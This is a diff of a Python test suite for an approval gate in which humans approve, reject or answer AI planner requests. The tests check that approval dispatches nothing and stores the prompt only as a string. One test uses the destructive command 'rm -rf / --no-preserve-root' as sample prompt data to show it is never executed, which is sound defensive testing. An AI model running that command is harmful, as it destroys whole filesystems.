         self.assertEqual(self.rows("planner_authority_events"), 1)
         stored = {value.event.answer_text for value, error in outcomes
@@ -934,7 +1240,9 @@ class Provenance(AuthorityHarness):
         request_id = self.prompt_request()
         with self.assertRaises(PlannerAuthorityInvalid):
             self.authority.approve_prepared_worker_prompt(
-                request_id, provenance={"actor": "user", "source": "internal_test"})
+                request_id,
+                expected_subject_fingerprint=self.current_fingerprint(request_id),
+                provenance={"actor": "user", "source": "internal_test"})
         self.assertIsNone(self.store.authority_event(request_id))
 
     def test_provenance_carries_no_identity_field(self):
@@ -946,8 +1254,7 @@ class Provenance(AuthorityHarness):
 
     def test_the_recorded_decision_answers_the_provenance_questions(self):
         request_id = self.prompt_request()
-        gate = self.authority.approve_prepared_worker_prompt(
-            request_id, provenance=AuthorityProvenance.local_call())
+        gate = self.approve(request_id, provenance=AuthorityProvenance.local_call())
         decision = gate.to_dict()["decision"]
         self.assertEqual(decision["provenance"], {"actor": "user",
                                                   "source": "local_call"})
@@ -971,37 +1278,34 @@ class ReadModel(AuthorityHarness):
 
     def test_an_approval_is_visible(self):
         request_id = self.prompt_request()
-        self.authority.approve_prepared_worker_prompt(request_id, provenance=self.who)
+        self.approve(request_id)
         payload = self.authority.view(request_id).to_dict()["human_gate"]
         self.assertEqual(payload["gate_state"], GATE_STATE_APPROVED)
         self.assertTrue(payload["decision"]["binds_current_subject"])
 
     def test_a_rejection_and_its_reason_are_visible(self):
         request_id = self.prompt_request()
-        self.authority.reject_prepared_worker_prompt(
-            request_id, reason="wrong scope", provenance=self.who)
+        self.reject(request_id, reason="wrong scope")
         payload = self.authority.view(request_id).to_dict()["human_gate"]
         self.assertEqual(payload["gate_state"], GATE_STATE_REJECTED)
         self.assertEqual(payload["decision"]["rejection_reason"], "wrong scope")
 
     def test_an_answer_is_exposed_on_an_answer_gate(self):
         request_id = self.question_request()
-        self.authority.answer_planner_question(
-            request_id, answer="postgres", provenance=self.who)
+        self.answer(request_id, "postgres")
         decision = self.authority.view(request_id).to_dict()["human_gate"]["decision"]
         self.assertEqual(decision["answer"], "postgres")
 
     def test_a_confirmation_decision_carries_no_answer_field(self):
         """There is no answer on a confirmation gate, so none is reported."""
         request_id = self.prompt_request()
-        self.authority.approve_prepared_worker_prompt(request_id, provenance=self.who)
+        self.approve(request_id)
         decision = self.authority.view(request_id).to_dict()["human_gate"]["decision"]
         self.assertNotIn("answer", decision)
 
     def test_the_gate_read_model_leaks_nothing(self):
         request_id = self.question_request()
-        self.authority.answer_planner_question(
-            request_id, answer="postgres", provenance=self.who)
+        self.answer(request_id, "postgres")
         payload = self.authority.view(request_id).to_dict()
 
         def keys(node):
@@ -1022,14 +1326,14 @@ class ReadModel(AuthorityHarness):
 
     def test_reads_are_idempotent(self):
         request_id = self.prompt_request()
-        self.authority.approve_prepared_worker_prompt(request_id, provenance=self.who)
+        self.approve(request_id)
         self.assertEqual(self.authority.view(request_id).to_dict(),
                          self.authority.view(request_id).to_dict())
 
     def test_the_planner_lifecycle_is_still_its_own_field(self):
         """Invocation lifecycle, planner action and gate state are three things."""
         request_id = self.prompt_request()
-        self.authority.approve_prepared_worker_prompt(request_id, provenance=self.who)
+        self.approve(request_id)
         payload = self.authority.view(request_id).to_dict()
         self.assertEqual(payload["planner_request"]["status"], STATUS_SUCCEEDED)
         self.assertEqual(payload["planner_request"]["action"],
@@ -1112,8 +1416,7 @@ class ApprovalDispatchesNothing(AuthorityHarness):
         request_id = self.prompt_request("go and do it")
         before = sorted(path.name for path in self.dir.iterdir())
 
-        gate = self.authority.approve_prepared_worker_prompt(
-            request_id, provenance=self.who)
+        gate = self.approve(request_id)
 
         self.assertEqual(gate.state, GATE_STATE_APPROVED)
         self.assertEqual(self.authority.gate(request_id).state, GATE_STATE_APPROVED)
@@ -1134,7 +1437,7 @@ class ApprovalDispatchesNothing(AuthorityHarness):
         before = dict(tasks.counts_by_state())
 
         request_id = self.prompt_request()
-        self.authority.approve_prepared_worker_prompt(request_id, provenance=self.who)
+        self.approve(request_id)
 
         self.assertEqual(dict(tasks.counts_by_state()), before)
         self.assertEqual(sum(tasks.counts_by_state().values()), 0)
@@ -1143,14 +1446,13 @@ class ApprovalDispatchesNothing(AuthorityHarness):
     def test_approval_touches_only_the_authority_table(self):
         request_id = self.prompt_request()
         before = self.store.get(request_id).to_dict()
-        self.authority.approve_prepared_worker_prompt(request_id, provenance=self.who)
+        self.approve(request_id)
         self.assertEqual(self.store.get(request_id).to_dict(), before)
         self.assertEqual(self.rows("planner_requests"), 1)
 
     def test_the_approved_prompt_is_still_only_a_string(self):
         request_id = self.prompt_request("rm -rf / --no-preserve-root")
-        gate = self.authority.approve_prepared_worker_prompt(
-            request_id, provenance=self.who)
+        gate = self.approve(request_id)
         self.assertEqual(gate.state, GATE_STATE_APPROVED)
         self.assertEqual(self.store.get(request_id).worker_prompt,
                          "rm -rf / --no-preserve-root")
@@ -1171,8 +1473,7 @@ class AnswerDoesNotReplan(AuthorityHarness):
         self.assertEqual(len(planner.calls), 1)
         requests_before = self.rows("planner_requests")
 
-        gate = self.authority.answer_planner_question(
-            outcome.planner_request_id, answer="postgres", provenance=self.who)
+        gate = self.answer(outcome.planner_request_id, "postgres")
 
         self.assertEqual(gate.state, GATE_STATE_ANSWERED)
         self.assertEqual(len(planner.calls), 1, "the planner was invoked again")
@@ -1181,8 +1482,7 @@ class AnswerDoesNotReplan(AuthorityHarness):
 
     def test_the_answer_is_bound_to_the_question_it_answered(self):
         request_id = self.question_request("hangi veritabanı?")
-        gate = self.authority.answer_planner_question(
-            request_id, answer="postgres", provenance=self.who)
+        gate = self.answer(request_id, "postgres")
         self.assertEqual(
             gate.event.subject_fingerprint,
             authority_subject_fingerprint(
@@ -1197,8 +1497,7 @@ class AnswerDoesNotReplan(AuthorityHarness):
         from cofferdam.workstation.tasks.adapters import build_registry
 
         request_id = self.question_request()
-        self.authority.answer_planner_question(
-            request_id, answer="do the second option", provenance=self.who)
+        self.answer(request_id, "do the second option")
         self.assertEqual(build_registry().ids(), ())
         self.assertFalse((self.dir / "tasks.sqlite3").exists())
 
